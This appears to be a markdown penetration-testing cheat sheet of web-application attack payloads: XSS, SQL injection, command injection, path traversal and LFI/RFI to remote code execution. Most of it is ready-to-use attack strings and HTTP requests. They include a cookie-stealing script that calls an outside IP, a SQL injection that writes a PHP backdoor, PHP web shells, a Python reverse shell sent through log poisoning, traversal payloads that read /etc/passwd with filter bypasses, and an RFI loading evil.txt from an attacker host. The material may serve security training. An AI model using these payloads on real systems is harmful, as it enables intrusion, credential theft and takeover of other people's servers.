# **<a name="webapp">Web Application table of Contents</a>**
* [XSS](#xss)
* [SQLi](#SQLi)
* [Command Injection](#Cinject)
* [Directory Path Traversal](#pathtrav)
* [LFI to RCE](#lfi2rce)
* [RFI to RCE](#rfi2rce)




# **<a name="xss">XSS</a>**

## Reflected 
`GET /?search=<script>alert(1)</script> HTTP/1.1`

### escape script and backslash

`</script><img src=1 onerror=alert(document.domain)>`  
`</script><script>alert(1)</script>`

### Back out of javascript string

`'-alert(document.domain)-'`  
`'+alert(document.domain)+'`  
`';alert(document.domain)//`  
`http://foo?&apos;-alert(1)-&apos;`  
`${alert(document.domain)}`  
`javascript:"/*'/*'/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>`  

## Stored

Enter the following into the comment box

`<script>alert(1)</script>`  
`"onmouseover="alert(1)`

Inserted in GET/POST request

`<a id="author" href="javascript:alert(document.domain)">test</a>`

## DOM XSS

If you search 5333 in search bar

in javascript function calls 

    function trackSearch(query) 
    {document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');}
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query){trackSearch(query);}  
    <img src="/resources/images/tracker.gif?searchTerms=5333">
                                          
search for 

` "><svg onload=alert(1)>`

this will break out new paramiter in javascript

     <img src="/resources/images/tracker.gif?searchTerms=">
     <svg onload="alert(1)">"&gt;
     <section class="blog-list">
     </section></svg>


### Sinks

https://brutelogic.com.br/blog/dom-based-xss-the-3-sinks/

Document sink
 
`name=<img+src+onerror=alert(1)>`
 
Location sink
 
`redir=javascript:alert(1)`  
`&storeId="></select><img+src%3d1+onerror%3dalert(1)>`
 
Execution sink eval call error
  
  `index=alert(1)`
  
  angular js sink
  
  `{{$on.constructor('alert(1)')()}}`
 

## Redirection

`<iframe SRC="http://<IP>/report" height = "0" width ="0"></iframe>`

```
<script> new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie; </script>
```



# **<a name="SQLi">SQLi</a>**

`xyz' OR 1=1--`


## Cheatsheats

|Title    | Concat  |  
| --------- | ------------- |
|Oracle | `'foo' \|\| 'bar'` |  
|Microsoft | `'foo'+'bar'` |  
|PostgreSQL | `'foo' \|\| 'bar'` |
|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  

|Title    | Comments |  
| --------- | ------------- |
|Oracle | `--comment` |  
|Microsoft | `--comment` or `/*comment*/` |  
|PostgreSQL | `--comment` or `/*comment*/` |
|MySQL | `-- comment` has to have space or `/*comment*/` or `#comment`|  

|Title    | Database Version |  
| --------- | ------------- |
|Oracle | `SELECT banner FROM v$version` |
|Oracle | `SELECT version FROM v$instance` |
|Microsoft | `SELECT @@version` |  
|PostgreSQL | `SELECT version()` |
|MySQL | `SELECT @@version` |

|Title    | Database Contents |  
| --------- | ------------- |
|Oracle | `SELECT * FROM all_tables` |
|Oracle | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
|Microsoft | `SELECT * FROM information_schema.tables` |  
|Microsoft | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` | 
|PostgreSQL | `SELECT * FROM information_schema.tables` |
|PostgreSQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
|MySQL | `SELECT * FROM information_schema.tables` |
|MySQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

|Title    | Conditional Errors |  
| --------- | ------------- |
|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
|Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |  
|PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
|MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

|Title    | Stacked Queries |  
| --------- | ------------- |
|Oracle | Does not support |
|Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |  
|PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
|MySQL | Does not support |

|Title    | Time Delays |  
| --------- | ------------- |
|Oracle | `dbms_pipe.receive_message(('a'),10)` |
|Microsoft | `WAITFOR DELAY '0:0:10'` |  
|PostgreSQL | `SELECT pg_sleep(10)` |
|MySQL | `SELECT sleep(10)` |


|Title    | Conditional Time Delays |  
| --------- | ------------- |
|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
|Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |  
|PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
|MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |

## Union


Injection

`xyz' UNION SELECT 'a' WHERE 1=1--`  
`xyz' UNION SELECT 'a' WHERE 1=2--`

Finding column lenghts

`' UNION SELECT NULL--`  
`' UNION SELECT NULL,NULL--`  
`' UNION SELECT NULL,NULL,NULL--`  

or  

`' ORDER BY 1--`  
`' ORDER BY 2--`  
`' ORDER BY 3--`  

Finding injectable fields  

`GET /filter?category=Accessories'+UNION+SELECT+NULL,'Injectable',NULL--+ HTTP/1.1`  
`' UNION SELECT 'a',NULL,NULL,NULL--`  
`' UNION SELECT NULL,'a',NULL,NULL--`  
`' UNION SELECT NULL,NULL,'a',NULL--`  
`' UNION SELECT NULL,NULL,NULL,'a'--`  

Retreiving Data

`GET /filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users-- HTTP/1.1`

Concat

`GET /filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--+ HTTP/1.1`


### Enumeration
MySQL

 Find Tables

`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,table_name+from+information_schema.tables%23&Submit=Submit HTTP/1.1`

Find current DB
        
`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,database()%23&Submit=Submit HTTP/1.1`

  Find All DB
  
`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,+schema_name+FROM+information_schema.schemata%23&Submit=Submit HTTP/1.1`

 Find all DB tables
        
`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+table_schema,+table_name+from+information_schema.tables%23&Submit=Submit HTTP/1.1`

 Find table columns
        
`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+NULL,+column_name+from+information_schema.columns+where+table_schema+%3d'dvwa'+and+table_name+%3d'users'%23&Submit=Submit HTTP/1.1`

List table info
        
`GET /DVWA/vulnerabilities/sqli/?id=2'or+1=1+UNION+SELECT+user,+password+FROM+dvwa.users%23&Submit=Submit HTTP/1.1`

 Using Concat_ws
        
`GET /DVWA/vulnerabilities/sqli/?id='+union+select+null,+concat_ws('%3a',first_name,last_name,user,password)+from+users+--+&Submit=Submit HTTP/1.1`

  using group_concat
        
`GET /DVWA/vulnerabilities/sqli/?id='+union+select+null,+group_concat(concat_ws('%3a',first_name,last_name,user,password)+separator+'\n')+from+users+%23&Submit=Submit HTTP/1.1`

Oracle

`'+UNION+SELECT+table_name,NULL+FROM+all_tables+--+`

`'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_LWSCID'+--+`

`'+UNION+SELECT+USERNAME_MYUNOL,+PASSWORD_GETKJX+FROM+USERS_LWSCID+--+`

### Code Injection

`UNION+ALL+SELECT+NULL,+NULL,LOAD_FILE('C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS')+--+`

`union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`

## Blind  
### Conditional Responses

`TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>2--`

in Intruder( step through substring for each character)

`TrackingId=xyz'+UNION+SELECT+'a'+FROM+users+WHERE+username+=+'administrator'+and+SUBSTRING(Password,+5,+1)+=+'§a§'+--+`

### Conditional Error

Will error on 1/0 showing user administrator is a valid user  
`xyz'+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+--+;`

To find password lenght  
`xyz'+UNION+SELECT+CASE+WHEN+(username+=+'administrator'+and+LENGTH(Password)+=+6)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+--`

to find each password charater  
`xyz'+UNION+SELECT+CASE+WHEN+(username+=+'administrator'+and+SUBSTR(Password,+1,+1)+=+'1')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users+--+`

### Time Delays

`xyz'||pg_sleep(10)+--+`

`xyz'||CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+`

`xyz'%3b+SELECT+CASE+WHEN+(username+='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+Users+--`

`xyz'%3b+SELECT+CASE+WHEN+(username+='administrator'+AND+length(Password)=6)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+Users+--+`



# **<a name="Cinject">Command Injection</a>**

 A number of characters function as command separators,  allowing commands to be chained together. The following command  separators work on both Windows and Unix-based systems:         
            •                 &            
            •                 &&            
            •                 |            
            •                 ||            
                             The following command separators work only on Unix-based systems:         
            •                 ;            
            •                 Newline (0x0a or \n)            
                             On Unix-based systems, you can also use backticks or the  dollar character to perform inline execution of an injected command  within the original command:         
            •                \` injected command \`            
            •                 $( injected command )       

### Blind   
The following examples are of POST requests

Tests to see if there is a delay doing the ping  
`email=test%40gmail.com||ping+-c+10+127.0.0.1||&subject=test&message=test`

Tests by putting output to a web viewable directory  
`email=test%40gmail.com||whoami+>+/var/www/images/who.txt||&subject=test&message=test`



# **<a name="pathtrav">Directory Path Traversal aka LFI </a>**

`GET /image?filename=../../../etc/passwd HTTP/1.1`

Byapss Defensive filters

`GET /image?filename=/etc/passwd HTTP/1.1`

`GET /image?filename=....//....//....//etc//passwd HTTP/1.1`

`GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1`

`GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1`

`GET /image?filename=../../../etc/passwd%00.png HTTP/1.1`

odd characters or double encoded 

`À¯`  
`%c0%af`

`/`  
`%2f`  
`%252f`  



# **<a name="lfi2rce">LFI to RCE</a>**



## Log Poisoning

Include the following in a GET request and when you view the access.log file it will show the php info verison  
`/<?php phpinfo(); ?>`  

### Exploiting 

Request 1  
`$ nc secureapplication.example 80`   
`GET /<?php system($_GET['cmd']);?>`

Request 2  
 `curl 10.10.10.10/index.php?view=../../var/log/apache2/access.log&cmd=python+-c+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Other variations of php LFI to RCE

`<?php system($_REQUEST['vipertooth']); ?>`      
save as file named hack.php

`curl 10.10.10.104/hack.php?vipertooth=whoami`

should be limited shell

```sudo echo -e “<?=\`\$_POST[vipertooth]\`?>\r<?='PHP Test';?>” > /var/www/html/test.php```

`curl localhost/test.php -d vipertooth=whoami`

or 

`<?php echo shell_exec($_GET['cmd']);?>`


## Proc Environ Injection

Testing  
`curl 
http://secureapplication.example/index.php?view=../../../proc/self/environ
`  

if it works put `<?php system($_GET['cmd']);?>` in the user-agent field then run request with 
` curl 
http://secureapplication.example/index.php?view=../../../proc/self/environ&cmd=ipconfig
` 

# **<a name="rfi2rce">RFI to RCE</a>**

`http://<IP>/something.php?name=a&comment=b&LANG=http://<attackIP>/evil.txt`

```
cat evil.txt
<?php echo shell_exec("ipconfig");?>
```


Referances:

https://portswigger.net/web-security  
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2
